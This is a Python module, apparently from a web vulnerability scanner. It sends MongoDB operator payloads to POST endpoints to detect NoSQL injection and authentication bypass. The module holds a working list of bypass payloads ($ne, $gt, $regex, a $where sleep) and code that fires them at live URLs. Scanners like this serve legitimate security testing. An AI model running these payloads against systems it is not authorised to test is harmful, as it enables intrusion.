"""NoSQL injection probe."""

import json
from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache

from ._confidence import probe_confidence, probe_severity
from ._patterns import NOSQL_ERROR_RE


def nosql_injection_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 10,
) -> list[dict[str, Any]]:
    """Send JSON body payloads with MongoDB operators to POST endpoints.

    Tests for authentication bypass, error messages, and different
    response patterns using NoSQL operators like $gt, $ne, $regex, $where.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of NoSQL injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    nosql_payloads = [
        ("gt_empty", {"username": {"$gt": ""}, "password": {"$gt": ""}}),
        ("ne_null", {"username": {"$ne": None}, "password": {"$ne": None}}),
        ("regex_all", {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
        ("ne_empty", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
        ("gt_zero", {"username": {"$gt": 0}, "password": {"$gt": 0}}),
        ("in_array", {"username": {"$in": ["admin", "root", "user"]}, "password": {"$ne": None}}),
        ("regex_admin", {"username": {"$regex": "^admin"}, "password": {"$ne": None}}),
        ("where_sleep", {"$where": "sleep(1000)"}),
        ("regex_obj", {"username": {"$regex": ".*"}, "password": {"$gte": ""}}),
        ("type_array", {"username": {"$type": "array"}, "password": {"$type": "array"}}),
    ]

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        baseline = response_cache.get(url)
        baseline_status = int(baseline.get("status_code") or 0) if baseline else 0
        baseline_len = len(str(baseline.get("body_text") or "")) if baseline else 0

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for payload_name, payload_body in nosql_payloads:
            if len(url_probes) >= 2:
                break

            response = response_cache.request(
                url,
                method="POST",
                headers={
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/json",
                    "X-NoSQL-Probe": "1",
                },
                body=json.dumps(payload_body),
            )
            if not response:
                continue

            body = str(response.get("body_text", "") or "")[:8000]
            status = int(response.get("status_code") or 0)
            response_len = len(body)

            issues_for_hit: list[str] = []

            if baseline_status in (401, 403) and status == 200:
                issues_for_hit.append("nosql_auth_bypass")
            elif NOSQL_ERROR_RE.search(body):
                issues_for_hit.append("nosql_error_pattern")
            elif status != baseline_status and status < 500:
                issues_for_hit.append("nosql_response_divergence")
            elif abs(response_len - baseline_len) > baseline_len * 0.5 and baseline_len > 0:
                issues_for_hit.append("nosql_response_divergence")

            if issues_for_hit:
                url_issues.extend(issues_for_hit)
                url_probes.append(
                    {
                        "payload_type": payload_name,
                        "payload": payload_body,
                        "baseline_status": baseline_status,
                        "response_status": status,
                        "baseline_length": baseline_len,
                        "response_length": response_len,
                        "issues": issues_for_hit,
                    }
                )

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
